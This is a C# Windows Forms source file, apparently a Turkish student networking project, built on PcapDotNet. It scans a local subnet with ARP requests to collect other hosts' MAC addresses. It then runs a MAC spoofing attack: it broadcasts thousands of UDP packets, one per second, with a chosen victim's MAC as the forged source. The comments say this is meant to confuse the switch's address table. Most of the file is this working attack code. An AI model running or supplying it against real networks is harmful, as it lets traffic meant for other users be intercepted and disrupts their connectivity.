using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using PcapDotNet.Base;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Dns;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.Gre;
using PcapDotNet.Packets.Http;
using PcapDotNet.Packets.Icmp;
using PcapDotNet.Packets.Igmp;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.IpV6;
using PcapDotNet.Packets.Transport;
using System.Net;

namespace AgProgramlamaProje_MacSpoofing
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        public String IpAdresim() // Sistemden ip adresinin çekildiği fonksiyon
        {
            string bilgisayarAdi = Dns.GetHostName();
            string ipAdresi = Dns.GetHostByName(bilgisayarAdi).AddressList[0].ToString();
            return ipAdresi;

        }
        public String MacAdresim() // Sistemden mac adresinin çekildiği fonksiyon
        {
            String macAdresim = "";
            String macAddr =
                     (
                         from nic in NetworkInterface.GetAllNetworkInterfaces()
                         where nic.OperationalStatus == OperationalStatus.Up
                         select nic.GetPhysicalAddress().ToString()
                     ).FirstOrDefault();
            char[] macadres = new char[12];
            macadres = macAddr.ToCharArray();
            macAdresim = macAddr[0] + macAddr[1].ToString() + ":" + macAddr[2].ToString() + macAddr[3].ToString() + ":" + macAddr[4].ToString() + macAddr[5].ToString() + ":" + macAddr[6].ToString() + macAddr[7].ToString() + ":" + macAddr[8].ToString() + macAddr[9].ToString() + ":" + macAddr[10].ToString() + macAddr[11].ToString();
            return macAdresim;
        }
        public String MacParcala(int x)// Mac adresini bloklara ayıran fonksiyon
        {
            string[] parcalar;
            parcalar = MacAdresim().Split(':');
            return parcalar[x];
        }
        public String IpParcala(int x)// Mac adresini bloklara ayıran fonksiyon
        {
            String[] parcalar;
            parcalar = IpAdresim().Split('.');
            return parcalar[x];
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            labelIpAdres.Text = IpAdresim(); // Aktif durumdaki ip adresi saptanıp label2'ye atandı.
            labelMacAdres.Text = MacAdresim(); // Aktif durumdaki mac adresi saptanıp label4'e atandı.
            label5.Text = IpParcala(0) + "." + IpParcala(1) + "." + IpParcala(2) + "."; // Aktif durumdaki ip adresinin ilk 3 bloğu label5'e atandı.
            label6.Text = IpParcala(0) + "." + IpParcala(1) + "." + IpParcala(2) + "."; // Aktif durumdaki ip adresinin ilk 3 bloğu label6'ya atandı.
        }

        private void buttonAgKesfi_Click(object sender, EventArgs e)// Ağda bulunan ciahzların mac adresleri bu fonksiyon yardımıyla arp paketleri gönderilerek elde edilir.
        {
            byte altdeger = Convert.ToByte(textBox2.Text);  //Ağ keşfi için kullanılacak sınır ipler belirlendi.
            byte ustdeger = Convert.ToByte(textBox3.Text);  //Ağ keşfi için kullanılacak sınır ipler belirlendi.
            IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
            PacketDevice selectedDevice = allDevices[2]; //Cihaz seçimi. Manuel olarak atanmıştır.
            using (PacketCommunicator communicator = selectedDevice.Open(100, 
                                                                        PacketDeviceOpenAttributes.Promiscuous, 
                                                                        1000)) 
            {
                //****************************** Ağ keşfi ******************************
                for (byte i = altdeger; i < ustdeger; i++) // Ağdaki istenilen ip aralığına arp paketleri gönderiir. Örn: "192.168.1.i"
                {
                    EthernetLayer ethernetLayer =
                    new EthernetLayer //Ethernet Katmanı
                    {
                        Source = new MacAddress(MacAdresim()), //Kaynak mac adresi. Fonksiyondan çekildi.
                        Destination = new MacAddress("ff:ff:ff:ff:ff:ff"), //Hedef mac adresi. Broadcast yayın yapıldı.
                        EtherType = EthernetType.None,
                    };

                    ArpLayer arpLayer =
                        new ArpLayer //Arp Katmanı
                        {
                            ProtocolType = EthernetType.IpV4,
                            Operation = ArpOperation.Request,
                            SenderHardwareAddress = new byte[] { 0x28, 0xd2, 0x44, 0x49, 0x7e, 0x2b }.AsReadOnly(), // Kaynak ac adresi.
                            SenderProtocolAddress = new byte[] { Convert.ToByte(IpParcala(0)), Convert.ToByte(IpParcala(1)),  Convert.ToByte(IpParcala(2)), Convert.ToByte(IpParcala(3)) }.AsReadOnly(), // Kaynak Ip adresi IpParcala fonksiyonundan bloklar halinde çekildi.
                            TargetHardwareAddress = new byte[] { 0, 0, 0, 0, 0, 0 }.AsReadOnly(), // Hedef Mac Adresi. Öğrenilmek istenen parametre. Request paketlerinde 00:00:00:00:00:00
                            TargetProtocolAddress = new byte[] { Convert.ToByte(IpParcala(0)), Convert.ToByte(IpParcala(1)), Convert.ToByte(IpParcala(2)), i }.AsReadOnly(), // Hedef Ip adresi IpParcala fonksiyonundan bulunulan ağın ilk 3 bloğu alındı. Son blok i değeri ile döngüye sokuldu.
                        };

                    PacketBuilder builder = new PacketBuilder(ethernetLayer, arpLayer); 
                    Packet arppacket = builder.Build(DateTime.Now); // Katmanlar paketlendi.
                    communicator.SendPacket(arppacket); // Arp paketi yayınlandı.


                    //****************************** ARP Paket dinleme ******************************
                    using (BerkeleyPacketFilter filter = communicator.CreateFilter("arp")) // Filtre uygulandı.
                    {
                        communicator.SetFilter(filter);
                    }
                    Packet packet;
                        PacketCommunicatorReceiveResult result = communicator.ReceivePacket(out packet);
                        switch (result)
                        {
                            case PacketCommunicatorReceiveResult.Ok:
                            if (!listBox1.Items.Contains(packet.Ethernet.Source + "\t\t\t@" + packet.Ethernet.Arp.SenderProtocolIpV4Address.ToString())) // Listbox'da oluşabilecek veri tekrarı önlendi.
                            {
                                listBox1.Items.Add(packet.Ethernet.Source + "\t\t\t@" + packet.Ethernet.Arp.SenderProtocolIpV4Address.ToString());  // Gelen Arp Paketlerinin Ethernet Katmanındna Source MAC Addres verisi çekildi.
                            }
                                break;
                        }
                }
            }
        }

        private void buttonMacTaklit_Click(object sender, EventArgs e)// Yayınlanan UDP paketlerinin ethernet katmanında Kaynak Mac adresi olarak taklit edilmek istenen Mac adresi yayınlanır. Bu sayede Switch'in Mac Adres Tablosu şaşırtılmış olur. 
        {
            String taklitmac = Convert.ToString(listBox1.SelectedItem).Substring(0,17); // Listbox'da seçilen satırdan Mac Adresi ayıklanarak taklitmac adlı Stringe atandı.
            IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
            PacketDevice selectedDevice = allDevices[2]; //Cihaz seçimi. Manuel olarak atanmıştır.
            using (PacketCommunicator communicator = selectedDevice.Open(100,
                                                                        PacketDeviceOpenAttributes.Promiscuous, 
                                                                        1000)) 
            {
                //****************************** UDP Paket Gönderme ******************************
                for (int j = 0; j < 10000; j++)
                {
                    EthernetLayer ethernetLayer =
                        new EthernetLayer // Ethernet Katmanı
                        {
                            Source = new MacAddress(taklitmac), // Kaynak Mac adresi. Taklit edilmek istenen Mac adresi.
                            Destination = new MacAddress("ff:ff:ff:ff:ff:ff"), // Hedef Mac adresi. Broadcast yayın yapıldı.
                            EtherType = EthernetType.None,
                        };

                    IpV4Layer ipV4Layer =
                                    new IpV4Layer // Ip Katmanı
                                    {
                                        Source = new IpV4Address(IpAdresim()),  // Kaynak Ip adresi
                                        CurrentDestination = new IpV4Address(IpParcala(0) + "." + IpParcala(1) + "." + IpParcala(2) + "." + "1"), //Hedef Ip adresi
                                        Fragmentation = IpV4Fragmentation.None,
                                        HeaderChecksum = null, 
                                        Identification = 123,
                                        Options = IpV4Options.None,
                                        Protocol = null, 
                                        Ttl = 100,
                                        TypeOfService = 0,
                                    };

                    UdpLayer udpLayer =
                        new UdpLayer // Udp Katmanı
                        {
                            SourcePort = 4050,
                            DestinationPort = 25,
                            Checksum = null, 
                            CalculateChecksumValue = true,
                        };

                    PayloadLayer payloadLayer =
                        new PayloadLayer // Payload Katmanı
                        {
                            Data = new Datagram(Encoding.ASCII.GetBytes("Merhaba Dunya")),
                        };

                    PacketBuilder builder = new PacketBuilder(ethernetLayer, ipV4Layer, udpLayer, payloadLayer);
                    Packet arppacket = builder.Build(DateTime.Now);
                    communicator.SendPacket(arppacket);
                    System.Threading.Thread.Sleep(1000); // 1'er saniye aralıklarla paketin gönderilmesi sağlanarak mac adres tablosu güncel tutulur.
                }
            }
        }

        private void buttonManuelTaklit_Click(object sender, EventArgs e)// Bir önceki metodun aynısı. Yalnızca Mac adresi elle atanıyor. TextBox'dan çekiliyor. 
        {
            String taklitmacmanuel = textBox1.Text;
            IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
            PacketDevice selectedDevice = allDevices[2]; //Cihaz seçimi. Manuel olarak atanmıştır.
            using (PacketCommunicator communicator = selectedDevice.Open(100, 
                                                                        PacketDeviceOpenAttributes.Promiscuous, 
                                                                        1000)) 
            {

                for (int j = 0; j < 10000; j++)
                {
                    EthernetLayer ethernetLayer =
                        new EthernetLayer
                        {
                            Source = new MacAddress(taklitmacmanuel),
                            Destination = new MacAddress("ff:ff:ff:ff:ff:ff"), 
                            EtherType = EthernetType.None,
                        };

                    IpV4Layer ipV4Layer =
                                    new IpV4Layer
                                    {
                                        Source = new IpV4Address(IpAdresim()),
                                        CurrentDestination = new IpV4Address(IpParcala(0) + "." + IpParcala(1) + "." + IpParcala(2) + "." + "1"),
                                        Fragmentation = IpV4Fragmentation.None,
                                        HeaderChecksum = null, 
                                        Identification = 123,
                                        Options = IpV4Options.None,
                                        Protocol = null, 
                                        Ttl = 100,
                                        TypeOfService = 0,
                                    };

                    UdpLayer udpLayer =
                        new UdpLayer
                        {
                            SourcePort = 4050,
                            DestinationPort = 25,
                            Checksum = null, 
                            CalculateChecksumValue = true,
                        };

                    PayloadLayer payloadLayer =
                        new PayloadLayer
                        {
                            Data = new Datagram(Encoding.ASCII.GetBytes("Merhaba Dunya")),
                        };

                    PacketBuilder builder = new PacketBuilder(ethernetLayer, ipV4Layer, udpLayer, payloadLayer);
                    Packet arppacket = builder.Build(DateTime.Now);
                    communicator.SendPacket(arppacket);
                    System.Threading.Thread.Sleep(1000); 
                }
            }
        }
    }
}    